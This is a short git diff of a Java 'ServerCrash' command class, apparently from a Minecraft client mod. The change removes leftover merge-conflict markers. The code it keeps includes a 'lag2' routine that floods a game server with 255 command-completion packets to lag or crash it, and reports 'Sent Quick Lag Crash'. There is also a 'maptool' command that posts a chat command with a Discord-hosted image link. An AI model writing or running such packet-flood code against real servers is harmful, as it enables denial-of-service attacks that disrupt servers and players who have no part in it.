@@ -153,7 +153,6 @@ public class ServerCrash extends Command {
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Quick Lag Crash");
             }
 
-<<<<<<< HEAD
             case "lag2" -> {
                 for(int i = 0; i < 255; i++){
                     client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/"));
@@ -161,8 +160,6 @@ public class ServerCrash extends Command {
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Quick Lag Crash");
             }
 
-=======
->>>>>>> 08546d61283129fdfeb469a104f2baacfa6d05fe
             case "maptool" -> {
                 int size = new IntegerArgumentParser().parse(args[1]);
                 client.player.sendChatMessage("/maptool new https://cdn.discordapp.com/attachments/956657243812675595/963652761172455454/unknown.png resize " + size + " " + size + "");
